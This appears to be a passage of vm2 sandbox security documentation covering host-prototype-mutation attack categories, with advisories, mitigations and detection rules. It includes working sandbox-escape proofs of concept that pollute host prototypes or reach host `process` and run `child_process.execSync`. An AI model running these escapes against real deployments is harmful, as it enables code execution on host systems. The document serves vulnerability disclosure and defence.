# Host Prototype Mutation

Writing into host-realm intrinsic prototypes from the sandbox: bridge `set`/`defineProperty` write-through, bridged setter primitives reached through the apply trap, `Receiver` confusion, and raw `__proto__` accessors.

Defense invariants enforced by fixes in this family: 6 (see [Defense Invariants](../ATTACKS.md#defense-invariants)).

Categories in this file: [20](host-prototype-mutation.md#attack-category-20-host-intrinsic-prototype-pollution-via-bridge-write-traps), [26](host-prototype-mutation.md#attack-category-26-sandbox-realm-null-proto-via-bridge-from--set-trap-write-through), [30](host-prototype-mutation.md#attack-category-30-host-prototype-mutation-via-bridged-setter-primitives), [32](host-prototype-mutation.md#attack-category-32-bridge-set-trap-ignores-spec-receiver--inherited-receiver-write-through), [37](host-prototype-mutation.md#attack-category-37-stacked-indirection-bypass-of-host-prototype-mutator-peel), [50](host-prototype-mutation.md#attack-category-50-host-prototype-chain-climb-via-raw-__proto__-getter-reader-side).

---

## Attack Category 20: Host Intrinsic Prototype Pollution via Bridge Write Traps

**Advisories**: GHSA-vwrp-x96c-mhwq, GHSA-m5q2-4fm3-vfqp, GHSA-3vgf-8m4q-q4qr, GHSA-59g5-pmg6-5gr4 (dup of GHSA-3vgf-8m4q-q4qr)

**Tests**: test/ghsa/GHSA-vwrp-x96c-mhwq/, test/ghsa/GHSA-m5q2-4fm3-vfqp/, test/ghsa/GHSA-3vgf-8m4q-q4qr/

### Description

Before GHSA-vwrp-x96c-mhwq, `BaseHandler.set` and `BaseHandler.defineProperty` forwarded every sandbox write directly into the wrapped host object via `otherReflectSet` / `otherReflectDefineProperty`. Both traps now consult `isProtectedHostObject` first and forward only writes aimed at non-intrinsic host objects. For ordinary host instances (a Buffer, a host-provided config object) this is intentional and correct — sandbox code should be able to mutate state the host explicitly handed it. For host-realm **intrinsic prototypes** (Object.prototype, Array.prototype, Function.prototype, Error.prototype, etc.) it is catastrophic: the mutation is globally observable to every host-side consumer of those prototypes, enabling prototype pollution that crosses the sandbox boundary in the most damaging direction. `deleteProperty` and `preventExtensions` had analogous gaps — sandbox code could `delete Object.prototype.hasOwnProperty` from the host realm, or freeze host prototypes to durably break unrelated host code.

### Attack Flow

1. **Reach a host intrinsic prototype.** Walk the prototype chain via `({}).__lookupGetter__('__proto__')` composed with `Buffer.apply`, ending at host `Object.prototype` (or `Array.prototype`, `Function.prototype`, etc.). Several earlier advisories (GHSA-grj5, GHSA-47x8, …) provided this walk; the same primitive lands here.
2. **Write through the bridge.** With the bridge proxy wrapping host `Object.prototype` in hand, any of the following sandbox writes lands in the host realm:
   - `hostProto.x = v` → `set` trap → `otherReflectSet(hostObjectPrototype, 'x', v)`.
   - `Object.defineProperty(hostProto, 'x', {value: v})` → `defineProperty` trap → `otherReflectDefineProperty(...)`.
   - `Reflect.set(hostProto, 'x', v)` / `Reflect.defineProperty(hostProto, ...)` — same traps.
   - `delete hostProto.someProp` → `deleteProperty` trap → `otherReflectDeleteProperty(...)`.
   - `Object.preventExtensions(hostProto)` → `preventExtensions` trap → host prototype frozen forever.
3. **Observe pollution from host code.** Any host-side code that subsequently reads from objects of the affected class sees the attacker's value.

### Canonical Example

```javascript
// (advisory GHSA-vwrp-x96c-mhwq)
const g = ({}).__lookupGetter__;
const a = Buffer.apply;
const p = a.apply(g, [Buffer, ['__proto__']]);
const hostObjectProto = p.call(p.call(p.call(p.call(Buffer.of()))));
hostObjectProto.vm2EscapeMarker = 'polluted-object-prototype';
// Host-side: ({}).vm2EscapeMarker === 'polluted-object-prototype' — global pollution.
```

### Why It Works

The bridge's design separated sandbox-realm reasoning from host-realm reasoning at the proxy boundary, but the four write traps (`set`, `defineProperty`, `deleteProperty`, `preventExtensions`) were unconditionally pass-through. Most host objects exposed to the sandbox are values the host *intends* to make mutable — so a blanket "no writes to host objects" rule would break legitimate API contracts. The actual invariant being violated is narrower: "host-realm objects whose state is observed by host code outside the sandbox must be read-only from the sandbox's perspective." Intrinsic prototypes are the canonical example of such objects.

### Mitigation

`createBridge()` builds a closure-scoped `WeakMap` of "protected host objects" at bridge init, populated with every entry in `otherGlobalPrototypes` (the cached intrinsic prototypes — Object, Array, Function, Error and subclasses, RegExp, Promise, Number/String/Boolean wrappers, Date, Map, Set, WeakMap, WeakSet, AsyncFunction, GeneratorFunction, AsyncGeneratorFunction, SuppressedError, AggregateError, VMError) plus each prototype's `.constructor` value (so the host `Object`/`Array`/`Function` constructors themselves are also protected). The four write traps in `BaseHandler` — `set`, `defineProperty`, `deleteProperty`, `preventExtensions` — now check `isProtectedHostObject(object)` before any `otherReflect*` mutation call and throw `VMError(OPNA)` on hit. The check fires only when `!isHost` (sandbox-originated writes); host-side embedder code writing to its own intrinsics through other paths is unaffected.

The protected set is captured *before* any sandbox code runs, and is keyed on raw host-realm object identity — so prototype-pollution attempts that try to subvert the check itself (e.g., `Array.prototype.constructor = attackerFn`) fail because the WeakMap holds the original references.

**Symbol-key augmentation (GHSA-m5q2-4fm3-vfqp)**: the per-object `isProtectedHostObject` check fires only for intrinsic prototypes, so non-intrinsic host objects (a plain `{}` exposed via `vm.sandbox.x`, a host function, a Buffer instance) remained writable from the sandbox. That is intentional — embedders need to expose mutable host state — but it interacts badly with [Category 8](host-reference-primitives.md#attack-category-8-cross-realm-symbol-extraction-from-host-objects)-class symbol leaks: a sandbox that obtains a real `nodejs.*` cross-realm symbol could install a host-side hook (util.promisify, stream brand, webstream controller) on any such non-protected host object and steer host control flow without ever needing host RCE. The four write traps (`set`, `defineProperty`, `deleteProperty` — plus `preventExtensions` already covered by the original Cat-20 fix) now also reject any sandbox-originated key that satisfies `isDangerousCrossRealmSymbol(key)`. This is the symmetric counterpart to the existing read-direction symbol filter: even if a future bypass surfaces a dangerous symbol back inside the sandbox, it cannot be installed as a key on any bridge-wrapped host object.

**Binary-data & iterator intrinsic augmentation (GHSA-3vgf-8m4q-q4qr / GHSA-59g5-pmg6-5gr4)**: the protected inventory was populated from `globalsList`, which listed only `Number`/`String`/`Boolean`/`Date`/`RegExp`/`Map`/`WeakMap`/`Set`/`WeakSet`/`Promise`/`Function` (plus `Object`/`Array`/errors). It omitted the entire **binary-data** family (`ArrayBuffer`, `SharedArrayBuffer`, `DataView`, every `TypedArray`, and the abstract `%TypedArray%.prototype`) and the **iterator** family (`ArrayIterator.prototype`, the String/Map/Set/RegExpString iterator prototypes, and the shared `%IteratorPrototype%`). Because `Buffer` extends `Uint8Array`, the exact Cat-20 walk reaches host `Uint8Array.prototype` / `%TypedArray%.prototype` / `ArrayBuffer.prototype` (and, from `Buffer.from([1]).values()`, the host iterator prototypes) — none of which were protected — so `Reflect.defineProperty` polluted them globally: a fresh host-side `new Uint8Array(1)` or `[].values()` observed the sandbox's marker, and overwriting `ArrayIterator.prototype.next` corrupts every host iteration. The named binary-data globals are now added to `globalsList`, and the abstract prototypes (`%TypedArray%`, `%IteratorPrototype%`, and the concrete iterator prototypes) are resolved structurally and added to `thisGlobalPrototypes` (mirroring the `AsyncFunction`/`GeneratorFunction` handling), so they flow into `protectedHostObjects`, the proto-mapping table, and the [Category 8 (GHSA-47x8-96vw-5wg6)](host-reference-primitives.md#attack-category-8-cross-realm-symbol-extraction-from-host-objects) identity map like every other intrinsic. This realizes the "Future Node intrinsics" item tracked under Considered Attack Surfaces below.

### Detection Rules

- **`hostProto.x = v`** — direct assignment to a bridge proxy of an intrinsic prototype.
- **`Object.defineProperty(hostProto, ...)`** / **`Reflect.defineProperty(...)`** — descriptor-based pollution.
- **`Reflect.set(hostProto, k, v)`** — reflective assignment.
- **`delete hostProto.x`** — sandbox-side property deletion on host intrinsic.
- **`Object.assign(hostProto, src)`** — bulk pollution via host-side `[[Set]]` calls.
- **`Object.preventExtensions(hostProto)`** / **`Object.freeze(hostProto)`** — durable host DoS.

### Considered Attack Surfaces

- **Non-intrinsic host objects** (Buffer instances, host-config objects, modules exposed via NodeVM externals) remain mutable from the sandbox. This is intentional — the host explicitly chose to expose them. The vulnerability class is specifically about *implicit* mutability of cross-cutting host invariants.
- **Future Node intrinsics.** The binary-data (`ArrayBuffer`/`SharedArrayBuffer`/`DataView`/`TypedArray`/`%TypedArray%`) and iterator (`ArrayIterator`/String/Map/Set/RegExpString iterators/`%IteratorPrototype%`) families are now protected (GHSA-3vgf-8m4q-q4qr / GHSA-59g5-pmg6-5gr4 — see the augmentation note above). Remaining un-cached intrinsics (`AsyncIterator.prototype`, `Temporal.*`, `Intl.*` prototypes, `WeakRef.prototype`, `FinalizationRegistry.prototype`) extend protection automatically once added to `globalsList` / `thisGlobalPrototypes`. Tracked as a future-risk item — see "Future Risks" below.

---

## Attack Category 26: Sandbox-Realm Null-Proto via Bridge `from()` — Set-Trap Write-Through

**Advisories**: GHSA-mpf8-4hx2-7cjg, GHSA-9vg3-4rfj-wgcm

**Tests**: test/ghsa/GHSA-mpf8-4hx2-7cjg/, test/ghsa/GHSA-9vg3-4rfj-wgcm/

**Uses**: [Category 1](host-reference-primitives.md#attack-category-1-constructor-chain-traversal) (host `Function` via `.constructor`), [Category 6](bridge-internals.md#attack-category-6-proxy-trap-exploitation) (bridge `set` trap as the actual leak vector).

**Supersedes**: defense-in-depth portion of GHSA-mpf8-4hx2-7cjg's fix that extended `from()` to `handleException` and `globalPromise.prototype.then` onFulfilled.

### Description

`bridge.from(other)` constructs a sandbox-side proxy whose internal target the bridge **treats as an other-realm (host) object**. The proxy's `set` trap therefore unwraps incoming sandbox bridge proxies (`otherFromThis(value)`) back to their raw host references and writes them directly onto the underlying target via `otherReflectSet(object, key, value)`.

When `from()` is called from a sandbox-side path with a **sandbox-realm null-proto value**, the proxy's underlying target IS the sandbox object. The write-through path then stores raw host references onto a sandbox-visible object, readable via the original sandbox reference (which bypasses the proxy entirely). Reading `.constructor` on a leaked host function yields host `Function`; `Function('return process')()` is RCE.

The post-GHSA-mpf8 hardening (commit `b57ac2d`, "setup-sandbox defense-in-depth (mpf8 symmetry)") added `from()` calls in three sandbox-side spots — `handleException` (transformer-instrumented JS catch path), `globalPromise.prototype.then` onFulfilled wrapper, and the `setHostPromiseSanitizers` install — for "symmetry" with the original GHSA-mpf8 fix. Two of those callsites receive sandbox-realm values and turn them into write-through proxies; this is the leak path GHSA-9vg3-4rfj-wgcm exploits.

CVSS:3.1 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). CWE-913 (Improper Control of Dynamically-Managed Code Resources).

### Attack Flow

1. Sandbox creates a null-proto carrier: `const o = {__proto__: null}`.
2. Sandbox throws it: `throw o`. Transformer-instrumented catch calls `e = handleException(e)`.
3. `handleException` was passing `e` through `from(e)`. With `e`'s prototype being null, `bridge.from()` had no proto-mapping to consult and built a sandbox-side proxy treating `o` as host-realm.
4. Sandbox writes a sandbox-side proxy of a host function onto the proxy: `e.f = Buffer.prototype.inspect`. The bridge `set` trap converts the sandbox value to host realm via `otherFromThis(value)`, yielding the **raw host `inspect`**, then stores it on the underlying target — which is the sandbox object `o`.
5. Sandbox reads via the original reference: `o.f` returns the raw host function (no proxy in the way; `o` IS sandbox-realm, so plain property access bypasses the bridge entirely).
6. `o.f.constructor` is host `Function` → `Function('return process')()` → host `process` → RCE.

The same bug exists on the `globalPromise.prototype.then` onFulfilled path: `Promise.resolve({__proto__:null}).then(e => { e.f = HostFn; ... })`.

### Canonical Examples

```javascript
// (advisory GHSA-9vg3-4rfj-wgcm)
const {VM} = require("vm2");
new VM().run(`
  const o = {__proto__: null};
  try {
    throw o;
  } catch (e) {
    e.f = Buffer.prototype.inspect;
    o.f.constructor("return process")()
      .mainModule.require('child_process').execSync('touch pwned');
  }
`);
```

```javascript
// Promise.then variant
new VM().run(`
  (async () => {
    const o = {__proto__: null};
    return Promise.resolve(o).then(e => {
      e.f = Buffer.prototype.inspect;
      return o.f.constructor('return process')();
    });
  })()
`).then(p => console.log(p)); // host process leaked
```

### Why It Works

`bridge.from()` (= `thisFromOtherWithFactory(defaultFactory, other)`) is **defined for host-realm inputs**. Its internal logic walks the prototype chain looking for a `protoMappings` entry; if proto is null and no mapping found, it creates a default proxy via `thisProxyOther(factory, other, null, dangerous)`. The bridge has no realm-tagging on raw values, so it cannot distinguish "host null-proto object the sandbox should see wrapped" (the GHSA-mpf8 motivating case) from "sandbox null-proto object the sandbox already owns" (this GHSA's case).

The post-GHSA-mpf8 commit `b57ac2d` extended `from()` to two sandbox-side callsites — `handleException` and `globalPromise.prototype.then` onFulfilled — purely for "symmetry"; no exploit existed for the sandbox-side path at the time. Those callsites do not receive host-realm values in normal flow: host throws are pre-converted by the bridge `apply`-trap's `thisFromOtherForThrow`, and host-promise resolutions are intercepted at the bridge level via `normalizeHostPromiseCallbacks`. The "symmetry" wrap therefore only ever fires on sandbox-realm values, where it creates the dangerous write-through proxy.

### Mitigation

Restores [Defense Invariant 2](../ATTACKS.md#defense-invariants) ("All caught exceptions are sanitized") with the **right** sanitizer for each callsite's actual realm context, and Defense Invariant 1 by ensuring `from()` is not used to "wrap" sandbox-realm values into host-treating proxies.

`lib/setup-sandbox.js`:

- `handleException` (line ~876): `e = from(e)` → `e = ensureThis(e)`. `ensureThis` returns sandbox-realm values unchanged and walks the proto chain only for host-mapped values, so a sandbox null-proto value stays sandbox-realm. SuppressedError / AggregateError sub-error recursion still works because each sub-call routes through the same `ensureThis` and the sub-error proto chain reaches a known host Error prototype mapping for genuinely-host sub-errors.
- `globalPromise.prototype.then` onFulfilled wrap (line ~283): same change. The host-promise resolution path is unaffected because it goes through `normalizeHostPromiseCallbacks` in `lib/bridge.js` — the apply-trap promise-boundary normalizer, which normalizes the then/catch argument pair by wrapping the callback slots in place — and that path keeps using `from()` (correct — values there ARE host-realm).
- `bridge.setHostPromiseSanitizers` install (line ~959): the rejection sanitizer is now `e => handleException(from(e))` instead of `handleException`. The explicit outer `from(e)` preserves the GHSA-mpf8 invariant for genuinely-host null-proto rejection values (they reach sandbox callbacks bridge-wrapped, not raw); the inner `handleException` then performs SuppressedError / AggregateError recursive sanitization on the wrapped value.

The fix surface is three lines of code in `setup-sandbox.js`, no bridge changes.

### Detection Rules

- **`from(value)` calls in sandbox-side code paths** — `lib/setup-sandbox.js` and any future sandbox-side callsite. Whenever the value can be sandbox-realm by construction (transformer catch path, sandbox-Promise rejection, executor catch), the call must use `ensureThis` (sandbox-passthrough for unmapped values) instead of `from` (always-wrap).
- **`{__proto__: null}` followed by `throw` or `Promise.resolve(...)` in untrusted code review** — the canonical attack carrier. Innocuous on its own, but combined with property assignment in catch / `.then` it's a write-through probe.
- **`obj.constructor("return process")` or `obj.f.constructor("return ...")` patterns** — the post-leak escape primitive. Flag in code review even when wrapped in try/catch.
- **Reverts of the b57ac2d "symmetry" change** — any future commit re-introducing `from()` in `handleException` or sandbox-side `Promise.prototype.then` onFulfilled must re-prove the realm assumption holds for every callsite reachable on those paths.

### Considered Attack Surfaces

- **`localPromise` constructor catch wrapper** (line ~76): `reject(handleException(e))`. The executor runs in the sandbox; `e` is a sandbox-realm thrown value (host throws inside an executor that was passed through the bridge would already be wrapped at the bridge boundary). `handleException` now uses `ensureThis` internally, so this path is safe.
- **Sandbox-side `localPromise.prototype.then` onRejected wrap** (line ~1170): also routes through `handleException`. Same reasoning — sandbox-realm rejection value, `ensureThis` correctly passes through.
- **`readonly()` factory `from(mock)` call** (line ~1281): `mock` is a sandbox-supplied user value that the embedder asked to read-only-mock onto a host target. The wrap is intentional (the value crosses TO the host as the read-side data). Sandbox cannot exploit the resulting proxy because it doesn't have a sandbox-side reference to the underlying mock object identity.
- **Bridge-level `normalizeHostPromiseCallbacks`** (`lib/bridge.js`) — the promise-boundary normalizer that normalizes the then/catch argument pair for host `Promise.prototype.then` / `.catch` invocations: still uses `from()` directly (installed as the fulfillment sanitizer by `bridge.setHostPromiseSanitizers(…, from)` in `lib/setup-sandbox.js`), correct because at that layer the value is host-realm by construction (delivered from host Promise machinery).

---

## Attack Category 30: Host Prototype Mutation via Bridged Setter Primitives

**Advisories**: GHSA-v6mx-mf47-r5wg, GHSA-9vg3-4rfj-wgcm

**Tests**: test/ghsa/GHSA-v6mx-mf47-r5wg/, test/ghsa/GHSA-9vg3-4rfj-wgcm/

**Uses**: [Category 2: Prototype Chain Manipulation](host-reference-primitives.md#attack-category-2-prototype-chain-manipulation), [Category 4: Error Object Exploitation](error-sanitization.md#attack-category-4-error-object-exploitation), [Category 7: Promise and Async Exploitation](promise-async.md#attack-category-7-promise-and-async-exploitation).

### Description

The bridge's `set` / `defineProperty` / `setPrototypeOf` proxy traps block direct mutation of host-realm objects from the sandbox (`isProtectedHostObject`). But the **apply trap** lets sandbox code invoke host functions with a host object as `this`. When the function being applied is host's `Object.prototype.__proto__` setter (or any prototype-mutating intrinsic — `Object.setPrototypeOf`, `Reflect.setPrototypeOf`, `Object.prototype.__defineSetter__`, etc.), the actual mutation happens inside the host intrinsic with `this` = the raw host object, **bypassing every write trap** because no proxy is involved in the assignment.

Severing even a non-protected host prototype (Node-internal `NodeError.prototype`, a per-error `[[Prototype]]`, etc.) is enough to break downstream bridge invariants: once a host-realm chain is truncated, the bridge's proto-walking helpers (`thisFromOtherWithFactory`, `thisFromOtherForThrow`, `thisEnsureThis`) can no longer find a registered mapping at the right level, and the value can fall through unwrapped. From there `e.constructor.constructor` resolves to host `Function`, and `new HostFunction("return process")()` yields RCE.

The PoC reaches host's `__proto__` setter via:

```javascript
const setProto = Buffer.call.call({}.__lookupSetter__, Buffer, "__proto__");
```

`{}.__lookupSetter__` is sandbox-side but `connect()`'ed to host's, so when applied through `Buffer.call.call(...)` it returns host's `Object.prototype.__proto__` setter (wrapped as a bridge proxy). Calling `setProto.call(<wrapped host object>, null)` invokes the wrapped host setter via the apply trap. Before this fix the trap simply unwrapped `context` and forwarded the call to `otherReflectApply(hostSetter, rawHostObject, [null])`, mutating the host object's prototype.

The canonical PoC pairs the setter primitive with `WebAssembly.compileStreaming()` to surface a host-realm `TypeError`:

CWE-913 (Improper Control of Dynamically-Managed Code Resources).

### Attack Flow

1. Resolve `getProto` / `setProto` to host's `Object.prototype.__proto__` accessor via `Buffer.call.call({}.__lookup{Getter,Setter}__, Buffer, "__proto__")`.
2. Trigger a host-realm rejection — `await WebAssembly.compileStreaming()` throws a host `TypeError`.
3. In `catch (e)`, the host `TypeError` arrives wrapped (the first time the bridge has seen it). Call `setProto.call(getProto.call(e), null)`. The apply trap unwraps `context` to the raw host `TypeError.prototype` and forwards to the host setter, severing the host `TypeError.prototype.[[Prototype]]` from host `Error.prototype`.
4. Trigger a second host-realm rejection. The fresh host `TypeError` instance walks back into sandbox code through V8 internals (the await machinery delivers it directly). The bridge's proto-walk no longer reaches a registered mapping at the right level, so `ensureThis` falls through and returns the raw host `TypeError` unwrapped.
5. Sandbox reads `e.constructor` → raw host `TypeError` (unwrapped, never crossed the bridge), `.constructor.constructor` → host `Function`. `new HostFunction("return process")()` returns host `process`. RCE.

### Canonical Example

```javascript
// (advisory GHSA-v6mx-mf47-r5wg)
const { VM } = require("vm2");
const vm = new VM();
vm.run(`
  "use strict";
  const getProto = Buffer.call.call({}.__lookupGetter__, Buffer, "__proto__");
  const setProto = Buffer.call.call({}.__lookupSetter__, Buffer, "__proto__");
  async function f() {
    try { await WebAssembly.compileStreaming(); }
    catch(e) { setProto.call(getProto.call(e), null); }
    try { await WebAssembly.compileStreaming(); }
    catch(e) {
      const HostFunction = e.constructor.constructor;
      new HostFunction("return process")()
        .mainModule.require('child_process').execSync('touch pwned');
    }
  }
  f();
`);
```

### Why It Works

The two underlying invariants violated:

- **Invariant A (write-side)**: "Sandbox code must not be able to mutate any host-realm object's prototype chain via the bridge." The proxy `set` / `defineProperty` / `setPrototypeOf` traps enforce this on direct mutation paths, but the apply trap creates a **second** mutation path — invoking a host prototype-mutating intrinsic *as a function* with a host object as `this`. The mutation happens inside the host intrinsic, not through any proxy, so no write trap fires.
- **Invariant B (read-side)**: "No host-realm object reaches sandbox code unwrapped." The bridge identifies host objects by walking the prototype chain looking for a registered mapping. When a host chain has been severed, the walk fails to find the mapping and helpers like `thisEnsureThis` fall through and return the raw host value AS-IS.

Together they form a compose-able primitive: mutate any host prototype → break the bridge's proto-walk recognition → next host value of that class arrives unwrapped → `e.constructor.constructor` chain to host `Function`.

### Mitigation

**Two-layer structural fix in `lib/bridge.js`.**

**Layer A (write-side, primary): apply-trap refusal of host prototype mutators.** At bridge init, cache the identity of every host-realm function that mutates `[[Prototype]]` (or could install code that mutates it):

```javascript
// host Object.prototype.__proto__ setter
addDangerousHostProtoMutator(
  otherSafeGetOwnPropertyDescriptor(otherGlobalPrototypes.Object, '__proto__').set
);
// host Object.prototype.__defineSetter__ / __defineGetter__
// host Object.setPrototypeOf / Object.defineProperty / Object.defineProperties
// host Reflect.setPrototypeOf / Reflect.defineProperty
```

In the apply trap:

```javascript
if (!isHost) {
  if (isDangerousHostProtoMutator(object)) throw new VMError(OPNA);
  // Peel one indirection layer: Function.prototype.call / .apply / .bind
  if (isApplyIndirectionPrimitive(object)) {
    const underlying = otherFromThis(context);
    if (isDangerousHostProtoMutator(underlying)) throw new VMError(OPNA);
  }
  // Peel Reflect.apply / Reflect.construct (underlying is args[0])
  if (isReflectApplyPrimitive(object)) {
    const underlying = otherFromThis(args[0]);
    if (isDangerousHostProtoMutator(underlying)) throw new VMError(OPNA);
  }
}
```

The indirection peel covers the canonical PoC shape (`setProto.call(tp, null)`, where the apply target is `Function.prototype.call` and the dangerous function is `context`), `setProto.apply(tp, [null])`, and `Reflect.apply(setProto, tp, [null])`. The peel is depth-1 — recursive indirection (`Function.prototype.call.call(...)`) collapses into the same shape at the V8 level because `Function.prototype.call` is the apply target and its `context` is the inner reference.

**Layer B (read-side, defense-in-depth): cache check before proto walk in `thisEnsureThis`.** Before walking the prototype chain, check `mappingOtherToThis` for an existing wrap of `other`. If found, return it. This catches host-realm values the bridge has already wrapped — even if their prototype chains were subsequently tampered with by some other route, the cache lookup is independent of the prototype chain.

We deliberately do **not** wrap on the proto-walk fall-through paths (null proto, walked-off without finding a mapping). Wrapping there would re-introduce GHSA-9vg3-4rfj-wgcm — a sandbox-realm `{__proto__: null}` value passed to `handleException` would be turned into a host-treating proxy whose `set` trap unwraps sandbox-side proxies of host references onto the underlying object, recreating the very escape that fix closed. Layer A prevents the canonical attack from reaching a state where a fresh, never-bridged host object surfaces here through a tampered proto chain.

### Detection Rules

- **Sandbox-applied host `Object.prototype.__proto__` setter** — reached via `__lookupSetter__` on a host-prototype-bearing reference (`Buffer`, `Error.prototype`, etc.). The cache `dangerousHostProtoMutators` identifies it regardless of how it's named in the sandbox.
- **Sandbox-applied host `Object.setPrototypeOf` / `Object.defineProperty` / `Object.defineProperties`** — reached via `Object` (a bridge proxy of host `Object`) or via a host-side method that returns these.
- **Sandbox-applied host `Reflect.setPrototypeOf` / `Reflect.defineProperty`** — reached via `Reflect` (bridge proxy). `Reflect.apply` and `Reflect.construct` are tracked as indirection primitives so a sandbox using `Reflect.apply(setProto, tp, [null])` is also caught.
- **Sandbox-applied host `Object.prototype.__defineSetter__` / `__defineGetter__`** — would install attacker-defined accessors on a host target. Indirect mutation primitive; same chokepoint.
- **`Function.prototype.call` / `.apply` / `.bind` indirection** — the apply trap peels one layer to inspect the underlying function being applied. `setProto.call(...)` and `setProto.apply(...)` are caught.
- **`Reflect.apply` / `Reflect.construct` indirection** — the apply trap peels these and inspects `args[0]` as the underlying function.

### Considered Attack Surfaces

- **Sandbox-realm `Object.setPrototypeOf` / `Reflect.setPrototypeOf` on sandbox values** — not in the dangerous-mutator set (only host-realm copies are). Sandbox code can still mutate its own prototypes freely.
- **`__proto__` *getter* (read-only)** — not blocked. Reading a host prototype is not, by itself, a privilege-escalation primitive, and blocking the getter would break legitimate `instanceof` and inspection paths. The attack requires *writing*, which is what the dangerous-mutator set covers.
- **Deeper indirection** (`Function.prototype.call.call.call(...)`) — depth-1 peel is **not** sufficient. See [Category 37](host-prototype-mutation.md#attack-category-37-stacked-indirection-bypass-of-host-prototype-mutator-peel). The structural fix is delivery-time refusal in `thisFromOtherWithFactory` / `thisFromOtherForThrow` / `thisEnsureThis` so the sandbox never holds a callable reference to a host prototype mutator regardless of how many indirection wrappers it stacks.
- **`Function.prototype.bind` returning a new function** — bound functions don't immediately apply; they're invoked later. When the bound function is eventually applied, the apply trap fires again with the bound function as `object`. The bound function unwraps to a host-realm "bound function exotic object" rather than the original target, so the simple identity check on the bound function's identity wouldn't hit. However, sandbox-controllable bind paths reaching a dangerous mutator can be tested adversarially; if a bypass surfaces, the peel should be extended.
- **Symbol-based "private" setter slots** — not known to exist for prototype mutation. The defense covers the documented set of mutators.

### Related Categories

- [Category 2: Prototype Chain Manipulation](host-reference-primitives.md#attack-category-2-prototype-chain-manipulation) — sets up the attacker's goal of mutating a host prototype chain.
- [Category 4: Error Object Exploitation](error-sanitization.md#attack-category-4-error-object-exploitation) — the canonical PoC uses host-realm `TypeError` as the carrier.
- [Category 7: Promise and Async Exploitation](promise-async.md#attack-category-7-promise-and-async-exploitation) — `WebAssembly.compileStreaming()` rejection is the host-error source.
- [Category 26: Sandbox-Realm Null-Proto via Bridge `from()`](host-prototype-mutation.md#attack-category-26-sandbox-realm-null-proto-via-bridge-from--set-trap-write-through) — explains why we cannot indiscriminately wrap fall-through values in `thisEnsureThis`.

---

## Attack Category 32: Bridge `set` Trap Ignores Spec `Receiver` — Inherited-Receiver Write-Through

**Advisories**: GHSA-c4cf-2hgv-2qv6, GHSA-m5q2-4fm3-vfqp, GHSA-vwrp-x96c-mhwq

**Tests**: test/ghsa/GHSA-c4cf-2hgv-2qv6/, test/ghsa/GHSA-m5q2-4fm3-vfqp/, test/ghsa/GHSA-vwrp-x96c-mhwq/

**Uses**: [Category 6: Proxy Trap Exploitation](bridge-internals.md#attack-category-6-proxy-trap-exploitation).

### Description

ECMA-262 §9.5.9 `[[Set]](P, V, Receiver)` for Proxy exotic objects supplies the *original recipient* of the assignment as the `Receiver` parameter to the trap. When sandbox code writes to an object that **inherits** from a bridge proxy (`Object.create(proxy).x = v`) or supplies a forged receiver (`Reflect.set(proxy, k, v, customReceiver)`), V8 invokes the trap with `Receiver` set to that recipient — *not* the proxy itself. The spec-mandated behaviour for the trap is to install the property on `Receiver`, mirroring how ordinary objects propagate `[[Set]]` up the prototype chain.

Before GHSA-c4cf-2hgv-2qv6, `BaseHandler.set` in `lib/bridge.js` ignored the `Receiver` argument and unconditionally forwarded the write through to the wrapped host object via `otherReflectSet(object, key, value)`. The trap now compares `receiver` against the canonical bridge proxy for the target and installs on the receiver itself when the two differ. Consequence of that pre-fix behaviour: **every host-realm object exposed to the sandbox becomes a write channel through any inheriting receiver.** A single `Object.create(hostObj)` produces a sandbox-side object whose every property write lands on the host object, bypassing any future write-side hardening that assumes "writes only arrive via direct `proxy.x = v` through the canonical proxy receiver". The originally reported path used `kCustom = Symbol.for('nodejs.util.promisify.custom')` as the write key against `Object.create(hostFn)` to install a sandbox-controlled function under the host promisifier dispatch slot, so `util.promisify(hostFn)()` on the host side would dispatch to attacker code. The class is generic to any key; the symbol-key shape was the sharpest end (host control flow hand-off) but plain string keys are equally write-through.

CVSS:3.1 ~8.0 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — direct host data integrity violation; full RCE requires the host to consume the polluted slot).

### Attack Flow

1. Sandbox obtains a reference to any host-realm object the embedder exposed — either via `sandbox: { x }` or any function/value reachable through the bridge.
2. Sandbox constructs an inheriting object: `const child = Object.create(hostObj)` (or any equivalent — `Reflect.set(hostObj, k, v, sandboxObj)`, `Object.create(Object.create(hostObj))`, `Object.assign(Object.create(hostObj), src)`).
3. Sandbox writes a property: `child[key] = sandboxValue`. V8's `[[Set]]` walks `child` → `proxy(hostObj)` and invokes the trap with `Receiver = child`.
4. The pre-fix trap discarded `Receiver` and ran `otherReflectSet(hostObj, key, value)`. The property landed on `hostObj` on the **host realm**.
5. Host code subsequently reads `hostObj[key]` (or `Object.getOwnPropertySymbols(hostObj)`, or dispatches through it via a well-known protocol such as `util.promisify`). The attacker's value is read; if the host treats it as a callable, sandbox code runs in the host realm.

### Canonical Example

```javascript
// (advisory GHSA-c4cf-2hgv-2qv6)
const util = require('util');
const { VM } = require('vm2');

const hostFn = function api(cb) { cb(null, 'real-data'); };
const vm = new VM();
vm.sandbox.hostFn = hostFn;

vm.run(`
  const kCustom = Symbol.for('nodejs.util.promisify.custom');
  const child = Object.create(hostFn);
  child[kCustom] = function () {
    return Promise.resolve('HIJACKED-VIA-RECEIVER-BUG');
  };
`);

// Host side:
util.promisify(hostFn)().then(console.log);   // → "HIJACKED-VIA-RECEIVER-BUG"
```

Five variants share the same primitive — `receiver !== <canonical proxy for target>`:

| # | Primitive |
|---|-----------|
| 1 | `Object.create(hostObj)[Symbol.for('nodejs.util.promisify.custom')] = fn` |
| 2 | `Object.create(hostObj).x = 'v'` (plain string key — no symbol involved) |
| 3 | `Reflect.set(hostObj, k, v, sandboxObj)` |
| 4 | `Object.create(Object.create(hostObj)).x = 'v'` (deep proto chain) |
| 5 | `Object.assign(Object.create(hostObj), { k: v })` |

### Why It Works

`BaseHandler.set` was written to "forward writes to the host target", a reasonable mental model when the only assumption is `proxy.x = v`. The spec, however, defines `[[Set]]` over the proxy as a single trap that subsumes *all* writes reaching the proxy through the prototype chain — including writes whose original recipient is some sandbox-side child. Two existing handlers got this right by accident: `ReadOnlyHandler.set` writes to `receiver` unconditionally (its policy is "host is read-only"), and `ProtectedHandler.set`'s function-value branch also installs on `receiver`. `BaseHandler.set` was the only trap that violated the spec — and because every non-intrinsic host object flows through `BaseHandler` (intrinsics go through `ProtectedHandler`'s OPNA short-circuit, read-only mocks go through `ReadOnlyHandler`), the bug applied to every embedder-exposed object the sandbox was ever handed.

